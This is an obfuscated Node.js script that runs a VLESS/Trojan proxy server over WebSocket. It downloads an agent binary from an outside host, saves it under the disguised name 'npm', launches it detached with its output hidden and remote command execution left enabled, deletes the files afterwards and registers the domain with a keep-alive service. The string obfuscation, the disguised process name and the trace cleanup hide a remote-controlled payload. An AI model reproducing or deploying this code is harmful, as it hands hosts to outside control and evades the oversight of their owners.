const _0x2bdc9e=_0x3049;(function(_0x380797,_0x84e7cd){const _0x2034d7=_0x3049,_0x20aee3=_0x380797();while(!![]){try{const _0x5a74f4=parseInt(_0x2034d7(0x18f))/0x1+-parseInt(_0x2034d7(0x18b))/0x2*(parseInt(_0x2034d7(0x1c6))/0x3)+parseInt(_0x2034d7(0x1c2))/0x4*(-parseInt(_0x2034d7(0x17b))/0x5)+-parseInt(_0x2034d7(0x1ab))/0x6*(-parseInt(_0x2034d7(0x180))/0x7)+-parseInt(_0x2034d7(0x18d))/0x8*(-parseInt(_0x2034d7(0x1b5))/0x9)+parseInt(_0x2034d7(0x14d))/0xa*(-parseInt(_0x2034d7(0x184))/0xb)+parseInt(_0x2034d7(0x19f))/0xc;if(_0x5a74f4===_0x84e7cd)break;else _0x20aee3['push'](_0x20aee3['shift']());}catch(_0x567ab6){_0x20aee3['push'](_0x20aee3['shift']());}}}(_0x441a,0xad13d));function _0x3049(_0xf46c8,_0x3c58ed){const _0x441abe=_0x441a();return _0x3049=function(_0x304969,_0x39ecbb){_0x304969=_0x304969-0x14b;let _0x5c4ece=_0x441abe[_0x304969];return _0x5c4ece;},_0x3049(_0xf46c8,_0x3c58ed);}const os=require('os'),http=require(_0x2bdc9e(0x16a)),fs=require('fs'),axios=require('axios'),net=require(_0x2bdc9e(0x1c7)),path=require(_0x2bdc9e(0x18e)),crypto=require('crypto'),{Buffer}=require(_0x2bdc9e(0x150)),{exec,execSync}=require(_0x2bdc9e(0x1b7)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2bdc9e(0x161)]||_0x2bdc9e(0x1bd),NEZHA_SERVER=process[_0x2bdc9e(0x1b3)][_0x2bdc9e(0x1a1)]||'',NEZHA_PORT=process[_0x2bdc9e(0x1b3)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2bdc9e(0x1b3)][_0x2bdc9e(0x1a0)]||'',DOMAIN=process['env'][_0x2bdc9e(0x1ac)]||_0x2bdc9e(0x170),AUTO_ACCESS=process[_0x2bdc9e(0x1b3)]['AUTO_ACCESS']||!![],WSPATH=process[_0x2bdc9e(0x1b3)][_0x2bdc9e(0x1b8)]||UUID[_0x2bdc9e(0x1aa)](0x0,0x8),SUB_PATH=process[_0x2bdc9e(0x1b3)][_0x2bdc9e(0x14f)]||_0x2bdc9e(0x154),NAME=process[_0x2bdc9e(0x1b3)][_0x2bdc9e(0x179)]||_0x2bdc9e(0x173),PORT=process[_0x2bdc9e(0x1b3)][_0x2bdc9e(0x1b6)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x39b667=_0x2bdc9e;try{const _0x40824e=await axios[_0x39b667(0x16f)](_0x39b667(0x1c3)),_0x32f92a=_0x40824e[_0x39b667(0x1c5)];ISP=(_0x32f92a[_0x39b667(0x155)]+'-'+_0x32f92a[_0x39b667(0x186)])[_0x39b667(0x17e)](/ /g,'_');}catch(_0x5683cd){ISP='Unknown';}};GetISP();const httpServer=http[_0x2bdc9e(0x194)]((_0x545bf5,_0x5d9c8b)=>{const _0x283848=_0x2bdc9e;if(_0x545bf5[_0x283848(0x1c8)]==='/'){const _0x415bef=path[_0x283848(0x1b0)](__dirname,_0x283848(0x198));fs[_0x283848(0x16b)](_0x415bef,'utf8',(_0x5e0b2e,_0x3148de)=>{const _0x2d34ec=_0x283848;if(_0x5e0b2e){_0x5d9c8b['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x5d9c8b[_0x2d34ec(0x197)]('Hello\x20world!');return;}_0x5d9c8b['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x5d9c8b[_0x2d34ec(0x197)](_0x3148de);});return;}else{if(_0x545bf5[_0x283848(0x1c8)]==='/'+SUB_PATH){const _0x17b6bb='vless://'+UUID+'@'+DOMAIN+_0x283848(0x1a9)+DOMAIN+_0x283848(0x1a4)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4d6229=_0x283848(0x16d)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x283848(0x1a4)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x34b796=_0x17b6bb+'\x0a'+_0x4d6229,_0x240f02=Buffer[_0x283848(0x187)](_0x34b796)['toString']('base64');_0x5d9c8b['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x5d9c8b['end'](_0x240f02+'\x0a');}else _0x5d9c8b[_0x283848(0x19c)](0x194,{'Content-Type':_0x283848(0x1a5)}),_0x5d9c8b['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2bdc9e(0x17e)](/-/g,''),DNS_SERVERS=[_0x2bdc9e(0x193),_0x2bdc9e(0x14b)];function _0x441a(){const _0x3f163e=['8.8.4.4','createServer','unlink','https://oooo.serv00.net/add-url','end','index.html','arch','npm\x20is\x20already\x20running,\x20skip\x20running...','&type=A','writeHead','npm\x20is\x20running','writeFileSync','791088piIGpF','NEZHA_KEY','NEZHA_SERVER','test','decode','&fp=chrome&type=ws&host=','text/plain','https://amd64.ssss.nyc.mn/agent','arm','type',':443?encryption=none&security=tls&sni=','slice','24bYLEPP','DOMAIN','pipe','--tls','connect','join','443','listen','env','/bin/bash','9ccqbnD','PORT','child_process','WSPATH','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','false','map','createWriteStream','e4a60750-06ad-4b89-a534-9bdf5a830c3e','\x20-p\x20','digest','error','close','64OVjeex','https://speed.cloudflare.com/meta','pop','data','3nZAYHT','net','url','1.1.1.1','application/dns-json','875820Adoeeu','includes','SUB_PATH','buffer','https://amd64.ssss.nyc.mn/v1','toString','Server\x20is\x20running\x20on\x20port\x20','sub','country','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://dns.google/resolve?name=','readUInt16BE','post','aarch64','substr','reduce','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','concat','createHash','chmod\x20+x\x20npm','UUID','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','hex','connection','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','arm64','length','2087','trim','http','readFile','utf-8','trojan://','log','get','1234.abc.com','write','catch','Hug','Answer','every','\x20with\x20all\x20DNS\x20servers','npm','then','NAME','Status','49390rjFTrA','finish','true','replace','npm\x20running\x20error:','1875174nilmhl','npm\x20download\x20successfully','config.yaml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','121rTbpCy','https://','asOrganization','from','readUInt8','find','stream','275300nwZsYF','2053','1101248XdBAqh','path','692917LYpYlI','setsid\x20nohup\x20./npm\x20-s\x20','sha224','send'];_0x441a=function(){return _0x3f163e;};return _0x441a();}function resolveHost(_0x4a098f){return new Promise((_0x39c787,_0x106483)=>{const _0x201733=_0x3049;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x201733(0x1a2)](_0x4a098f)){_0x39c787(_0x4a098f);return;}let _0x447b75=0x0;function _0xbc0158(){const _0x1c4b4a=_0x201733;if(_0x447b75>=DNS_SERVERS[_0x1c4b4a(0x167)]){_0x106483(new Error('Failed\x20to\x20resolve\x20'+_0x4a098f+_0x1c4b4a(0x176)));return;}const _0x400a97=DNS_SERVERS[_0x447b75];_0x447b75++;const _0x52b8f0=_0x1c4b4a(0x157)+encodeURIComponent(_0x4a098f)+_0x1c4b4a(0x19b);axios[_0x1c4b4a(0x16f)](_0x52b8f0,{'timeout':0x1388,'headers':{'Accept':_0x1c4b4a(0x14c)}})[_0x1c4b4a(0x178)](_0x34b200=>{const _0x2bd40e=_0x1c4b4a,_0x5270cc=_0x34b200['data'];if(_0x5270cc[_0x2bd40e(0x17a)]===0x0&&_0x5270cc[_0x2bd40e(0x174)]&&_0x5270cc[_0x2bd40e(0x174)][_0x2bd40e(0x167)]>0x0){const _0x35908a=_0x5270cc[_0x2bd40e(0x174)][_0x2bd40e(0x189)](_0x5f13f9=>_0x5f13f9[_0x2bd40e(0x1a8)]===0x1);if(_0x35908a){_0x39c787(_0x35908a[_0x2bd40e(0x1c5)]);return;}}_0xbc0158();})['catch'](_0x4b1f0e=>{_0xbc0158();});}_0xbc0158();});}function handleVlessConnection(_0x5a7ffc,_0x3914ea){const _0x50fadf=_0x2bdc9e,[_0x409b8d]=_0x3914ea,_0x3fafc3=_0x3914ea[_0x50fadf(0x1aa)](0x1,0x11);if(!_0x3fafc3[_0x50fadf(0x175)]((_0x464614,_0x3ba84a)=>_0x464614==parseInt(uuid[_0x50fadf(0x15b)](_0x3ba84a*0x2,0x2),0x10)))return![];let _0x2974ce=_0x3914ea[_0x50fadf(0x1aa)](0x11,0x12)['readUInt8']()+0x13;const _0x19bba0=_0x3914ea[_0x50fadf(0x1aa)](_0x2974ce,_0x2974ce+=0x2)[_0x50fadf(0x158)](0x0),_0x67c8cd=_0x3914ea[_0x50fadf(0x1aa)](_0x2974ce,_0x2974ce+=0x1)['readUInt8'](),_0x21c526=_0x67c8cd==0x1?_0x3914ea[_0x50fadf(0x1aa)](_0x2974ce,_0x2974ce+=0x4)[_0x50fadf(0x1b0)]('.'):_0x67c8cd==0x2?new TextDecoder()[_0x50fadf(0x1a3)](_0x3914ea[_0x50fadf(0x1aa)](_0x2974ce+0x1,_0x2974ce+=0x1+_0x3914ea[_0x50fadf(0x1aa)](_0x2974ce,_0x2974ce+0x1)[_0x50fadf(0x188)]())):_0x67c8cd==0x3?_0x3914ea[_0x50fadf(0x1aa)](_0x2974ce,_0x2974ce+=0x10)[_0x50fadf(0x15c)]((_0x448fb0,_0x355f3e,_0xd5054c,_0x3b082d)=>_0xd5054c%0x2?_0x448fb0[_0x50fadf(0x15e)](_0x3b082d['slice'](_0xd5054c-0x1,_0xd5054c+0x1)):_0x448fb0,[])[_0x50fadf(0x1bb)](_0x422306=>_0x422306[_0x50fadf(0x158)](0x0)[_0x50fadf(0x152)](0x10))[_0x50fadf(0x1b0)](':'):'';_0x5a7ffc[_0x50fadf(0x192)](new Uint8Array([_0x409b8d,0x0]));const _0x39e4d1=createWebSocketStream(_0x5a7ffc);return resolveHost(_0x21c526)[_0x50fadf(0x178)](_0x592f7e=>{const _0x417b4d=_0x50fadf;net[_0x417b4d(0x1af)]({'host':_0x592f7e,'port':_0x19bba0},function(){const _0x257ed7=_0x417b4d;this['write'](_0x3914ea[_0x257ed7(0x1aa)](_0x2974ce)),_0x39e4d1['on'](_0x257ed7(0x1c0),()=>{})['pipe'](this)['on'](_0x257ed7(0x1c0),()=>{})['pipe'](_0x39e4d1);})['on'](_0x417b4d(0x1c0),()=>{});})[_0x50fadf(0x172)](_0x5baaf9=>{const _0x21981c=_0x50fadf;net[_0x21981c(0x1af)]({'host':_0x21c526,'port':_0x19bba0},function(){const _0x15076d=_0x21981c;this['write'](_0x3914ea[_0x15076d(0x1aa)](_0x2974ce)),_0x39e4d1['on'](_0x15076d(0x1c0),()=>{})[_0x15076d(0x1ad)](this)['on']('error',()=>{})[_0x15076d(0x1ad)](_0x39e4d1);})['on'](_0x21981c(0x1c0),()=>{});}),!![];}function handleTrojanConnection(_0x323fe9,_0x9b31e8){const _0x1dc5df=_0x2bdc9e;try{if(_0x9b31e8[_0x1dc5df(0x167)]<0x3a)return![];const _0xfb313c=_0x9b31e8['slice'](0x0,0x38)[_0x1dc5df(0x152)](),_0x421ad6=[UUID];let _0x2bbc0b=null;for(const _0x20fb8a of _0x421ad6){const _0x560aea=crypto[_0x1dc5df(0x15f)](_0x1dc5df(0x191))['update'](_0x20fb8a)[_0x1dc5df(0x1bf)](_0x1dc5df(0x163));if(_0x560aea===_0xfb313c){_0x2bbc0b=_0x20fb8a;break;}}if(!_0x2bbc0b)return![];let _0x169f60=0x38;_0x9b31e8[_0x169f60]===0xd&&_0x9b31e8[_0x169f60+0x1]===0xa&&(_0x169f60+=0x2);const _0x3fa85b=_0x9b31e8[_0x169f60];if(_0x3fa85b!==0x1)return![];_0x169f60+=0x1;const _0x4a6e19=_0x9b31e8[_0x169f60];_0x169f60+=0x1;let _0x57f651,_0x3786fc;if(_0x4a6e19===0x1)_0x57f651=_0x9b31e8[_0x1dc5df(0x1aa)](_0x169f60,_0x169f60+0x4)['join']('.'),_0x169f60+=0x4;else{if(_0x4a6e19===0x3){const _0x32657d=_0x9b31e8[_0x169f60];_0x169f60+=0x1,_0x57f651=_0x9b31e8[_0x1dc5df(0x1aa)](_0x169f60,_0x169f60+_0x32657d)[_0x1dc5df(0x152)](),_0x169f60+=_0x32657d;}else{if(_0x4a6e19===0x4)_0x57f651=_0x9b31e8[_0x1dc5df(0x1aa)](_0x169f60,_0x169f60+0x10)[_0x1dc5df(0x15c)]((_0x3ba460,_0x255de2,_0x202eb9,_0x9b7428)=>_0x202eb9%0x2?_0x3ba460['concat'](_0x9b7428[_0x1dc5df(0x1aa)](_0x202eb9-0x1,_0x202eb9+0x1)):_0x3ba460,[])[_0x1dc5df(0x1bb)](_0x20d21d=>_0x20d21d[_0x1dc5df(0x158)](0x0)[_0x1dc5df(0x152)](0x10))[_0x1dc5df(0x1b0)](':'),_0x169f60+=0x10;else return![];}}_0x3786fc=_0x9b31e8[_0x1dc5df(0x158)](_0x169f60),_0x169f60+=0x2;_0x169f60<_0x9b31e8[_0x1dc5df(0x167)]&&_0x9b31e8[_0x169f60]===0xd&&_0x9b31e8[_0x169f60+0x1]===0xa&&(_0x169f60+=0x2);const _0x445c47=createWebSocketStream(_0x323fe9);return resolveHost(_0x57f651)[_0x1dc5df(0x178)](_0x4535d3=>{net['connect']({'host':_0x4535d3,'port':_0x3786fc},function(){const _0x1fc368=_0x3049;_0x169f60<_0x9b31e8['length']&&this[_0x1fc368(0x171)](_0x9b31e8[_0x1fc368(0x1aa)](_0x169f60)),_0x445c47['on'](_0x1fc368(0x1c0),()=>{})[_0x1fc368(0x1ad)](this)['on'](_0x1fc368(0x1c0),()=>{})[_0x1fc368(0x1ad)](_0x445c47);})['on']('error',()=>{});})[_0x1dc5df(0x172)](_0xd96593=>{const _0x24cea0=_0x1dc5df;net[_0x24cea0(0x1af)]({'host':_0x57f651,'port':_0x3786fc},function(){const _0x32183e=_0x24cea0;_0x169f60<_0x9b31e8['length']&&this['write'](_0x9b31e8[_0x32183e(0x1aa)](_0x169f60)),_0x445c47['on'](_0x32183e(0x1c0),()=>{})[_0x32183e(0x1ad)](this)['on'](_0x32183e(0x1c0),()=>{})[_0x32183e(0x1ad)](_0x445c47);})['on'](_0x24cea0(0x1c0),()=>{});}),!![];}catch(_0x3673f0){return![];}}wss['on'](_0x2bdc9e(0x164),(_0x709685,_0x2d33b4)=>{const _0x240080=_0x2bdc9e,_0x13e21f=_0x2d33b4['url']||'';_0x709685['once']('message',_0x3ff2=>{const _0x5eb07e=_0x3049;if(_0x3ff2[_0x5eb07e(0x167)]>0x11&&_0x3ff2[0x0]===0x0){const _0x22c0ca=_0x3ff2[_0x5eb07e(0x1aa)](0x1,0x11),_0x598279=_0x22c0ca['every']((_0x42e06a,_0x2df492)=>_0x42e06a==parseInt(uuid[_0x5eb07e(0x15b)](_0x2df492*0x2,0x2),0x10));if(_0x598279){!handleVlessConnection(_0x709685,_0x3ff2)&&_0x709685[_0x5eb07e(0x1c1)]();return;}}!handleTrojanConnection(_0x709685,_0x3ff2)&&_0x709685['close']();})['on'](_0x240080(0x1c0),()=>{});});const getDownloadUrl=()=>{const _0x5959a9=_0x2bdc9e,_0xd6689c=os[_0x5959a9(0x199)]();return _0xd6689c===_0x5959a9(0x1a7)||_0xd6689c===_0x5959a9(0x166)||_0xd6689c===_0x5959a9(0x15a)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5959a9(0x151):_0x5959a9(0x1a6);},downloadFile=async()=>{const _0xb7bbc2=_0x2bdc9e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x43b63b=getDownloadUrl(),_0x1a5990=await axios({'method':'get','url':_0x43b63b,'responseType':_0xb7bbc2(0x18a)}),_0x5d36a2=fs[_0xb7bbc2(0x1bc)](_0xb7bbc2(0x177));return _0x1a5990[_0xb7bbc2(0x1c5)][_0xb7bbc2(0x1ad)](_0x5d36a2),new Promise((_0x1cf014,_0x18d18d)=>{const _0x1d3dd5=_0xb7bbc2;_0x5d36a2['on'](_0x1d3dd5(0x17c),()=>{const _0x39369a=_0x1d3dd5;console[_0x39369a(0x16e)](_0x39369a(0x181)),exec(_0x39369a(0x160),_0x20bf4c=>{if(_0x20bf4c)_0x18d18d(_0x20bf4c);_0x1cf014();});}),_0x5d36a2['on'](_0x1d3dd5(0x1c0),_0x18d18d);});}catch(_0x301696){throw _0x301696;}},runnz=async()=>{const _0x3cf4ea=_0x2bdc9e;try{const _0x1de79e=execSync(_0x3cf4ea(0x15d),{'encoding':_0x3cf4ea(0x16c)});if(_0x1de79e[_0x3cf4ea(0x169)]()!==''){console[_0x3cf4ea(0x16e)](_0x3cf4ea(0x19a));return;}}catch(_0x1b3c75){}await downloadFile();let _0x197a2d='',_0x5a0849=[_0x3cf4ea(0x1b1),'8443','2096',_0x3cf4ea(0x168),'2083',_0x3cf4ea(0x18c)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x16d17d=_0x5a0849[_0x3cf4ea(0x14e)](NEZHA_PORT)?_0x3cf4ea(0x1ae):'';_0x197a2d=_0x3cf4ea(0x190)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3cf4ea(0x1be)+NEZHA_KEY+'\x20'+_0x16d17d+_0x3cf4ea(0x156);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12bf4d=NEZHA_SERVER[_0x3cf4ea(0x14e)](':')?NEZHA_SERVER['split'](':')[_0x3cf4ea(0x1c4)]():'',_0x434e4e=_0x5a0849['includes'](_0x12bf4d)?_0x3cf4ea(0x17d):_0x3cf4ea(0x1ba),_0x19b99b='client_secret:\x20'+NEZHA_KEY+_0x3cf4ea(0x183)+NEZHA_SERVER+_0x3cf4ea(0x165)+_0x434e4e+_0x3cf4ea(0x162)+UUID;fs[_0x3cf4ea(0x19e)]('config.yaml',_0x19b99b);}_0x197a2d='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x3cf4ea(0x16e)](_0x3cf4ea(0x1b9));return;}}try{exec(_0x197a2d,{'shell':_0x3cf4ea(0x1b4)},_0x379555=>{const _0x48f3e4=_0x3cf4ea;if(_0x379555)console['error'](_0x48f3e4(0x17f),_0x379555);else console['log'](_0x48f3e4(0x19d));});}catch(_0x3c9c8c){console['error']('error:\x20'+_0x3c9c8c);}};async function addAccessTask(){const _0x522280=_0x2bdc9e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5a77f4=_0x522280(0x185)+DOMAIN;try{const _0x221c86=await axios[_0x522280(0x159)](_0x522280(0x196),{'url':_0x5a77f4},{'headers':{'Content-Type':'application/json'}});console[_0x522280(0x16e)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5f7202){}}const delFiles=()=>{const _0x3a1300=_0x2bdc9e;fs[_0x3a1300(0x195)](_0x3a1300(0x177),()=>{}),fs['unlink'](_0x3a1300(0x182),()=>{});};httpServer[_0x2bdc9e(0x1b2)](PORT,()=>{const _0x488ee1=_0x2bdc9e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x488ee1(0x16e)](_0x488ee1(0x153)+PORT);});
